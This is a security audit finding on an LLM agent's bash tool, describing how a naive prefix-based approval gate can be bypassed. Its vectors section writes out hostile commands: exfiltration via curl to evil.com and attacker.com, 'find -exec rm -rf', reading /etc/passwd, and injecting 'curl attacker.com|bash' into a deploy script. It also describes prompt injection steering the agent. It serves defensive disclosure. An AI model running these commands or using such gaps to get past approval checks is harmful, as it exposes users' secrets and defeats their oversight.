# p4-f02: Agent Tool Call -> bash -c: Shell Metacharacter and Pipe Bypass

**Severity**: HIGH
**CWE**: CWE-78 (OS Command Injection)
**DFD Slice**: DFD-3 (LLM Output -> Agent Tool -> bash -c)
**Status**: Confirmed

## Location

- `x/tools/bash.go:64`: `exec.CommandContext(ctx, "bash", "-c", command)` — LLM-controlled `command` string
- `x/agent/approval.go:204-299`: `extractBashPrefix()` — naive string-based analysis
- `x/agent/approval.go:218-222`: `safeCommands` includes `find`, `sed`, `grep`

## Description

LLM tool call arguments flow directly to `bash -c`. The approval system uses naive string analysis (`strings.Split(command, "|")`, `strings.Fields`) while bash performs full shell interpretation. Multiple bypass vectors:

### Vector A — Pipe Target Not Checked
`extractBashPrefix` only examines the FIRST command in a pipe chain. A command like:
```
cat tools/safe.go | curl -d @- evil.com
```
Gets prefix `cat:tools/` and is auto-approved. The `curl -d` (data exfiltration) is never checked. Note: `curl -d` IS in `denyPatterns`, but `curl evil.com < tools/safe.go` is not.

### Vector B — find -exec Bypass
`find` is in `safeCommands`. Approving `find tools/ -name "*.go"` creates prefix `find:tools/`, which auto-approves:
```
find tools/ -exec rm -rf {} \;
find tools/ -exec curl attacker.com/$(cat /etc/passwd) \;
```

### Vector C — sed -i Bypass
`sed` is in `safeCommands`. Approving `sed 's/foo/bar/' tools/file.go` creates prefix `sed:tools/`. This auto-approves:
```
sed -i 's/exit 0/curl attacker.com|bash/' tools/deploy.sh
```
`sed -i` performs in-place file modification.

### Vector D — Shell Metacharacter Injection
Command substitution in arguments: `cat tools/$(cat /etc/passwd)` — prefix extractor sees path starting with `tools/`, approves, bash executes the subshell.

### Vector E — curl GET Not Denied
`denyPatterns` only blocks `curl -d`, `curl --data`, `curl -X POST`, `curl -X PUT`. A plain `curl evil.com` (GET request to exfiltrate via URL params) or `curl -O evil.com/malware` is not blocked.

## Evidence

- `x/tools/bash.go:64` — unfiltered command to `bash -c`
- `x/agent/approval.go:206` — only first pipe segment checked
- `x/agent/approval.go:218-222` — `find`, `sed` in safeCommands without flag restriction
- `x/agent/approval.go:95-122` — denyPatterns list with gaps

---

## Phase 7 Enrichment Verdict

**Classification**: SECURITY — likely security

**Attacker Control**: The LLM output controls the `command` string passed to `bash -c`. In an agentic context, attacker influence over LLM outputs arrives via: (a) prompt injection in tool outputs (e.g., webpage content fetched by `web_fetch`), (b) adversarial model fine-tuning, (c) malicious model from registry. The LLM is an untrusted intermediary in the threat model for the approval system.

**Runtime**: CLI process (`ollama run` with agent tools enabled) — `x/` package, not the HTTP server. Executes on the user's local machine.

**Trust Boundary Crossed**: LLM-to-host-OS trust boundary. The approval system's purpose is to enforce this boundary; these bypasses render it ineffective. Once an approved prefix exists, the LLM (potentially influenced by external content) can execute arbitrary commands without further user consent.

**Effect**: Same-user code execution. No cross-user impact in the local context, but the user's filesystem, secrets (SSH keys, tokens, credentials), and network access are fully exposed.

**CodeQL Reachability**: No pre-computed slice. Manual trace confirms: `x/cmd/run.go` -> `approval.IsAllowed()` -> `extractBashPrefix()` (first-pipe-only analysis) -> returns allowed -> `x/tools/bash.go:64` -> `exec.CommandContext(ctx, "bash", "-c", command)`. The bypass vectors operate between the approval check and execution — no dead code.

**KB Cross-Reference**: Confirmed as high-severity in KB bypass analysis (Phase 6). Vectors 3, 5, 7 rated HIGH exploitability. Patch commits `c8b599bd` + `44179b7e` addressed path traversal in prefix matching but did not resolve these structural shell-parsing gaps. `YoloMode=true` completely disables approval system (KB bypass vector 1).

**Exploit Prerequisites**:
- Agent mode must be active (user is using an agent model with `x/tools/bash.go` tooling)
- At least one bash command must have been previously approved (to seed the prefix allowlist), OR the LLM must generate a command that passes the initial approval prompt with user consent
- LLM must be influenced (via prompt injection in fetched content, adversarial model, etc.) to generate a bypass command

**Verdict**: KEEP — HIGH security finding. Structural design flaw: string-split approval gate cannot safely gate `bash -c` execution. The fundamental fix requires not using `bash -c` with user-approved prefixes, but instead a strict command+argument allowlist executed via `exec.Command(cmd, args...)` without shell interpretation.
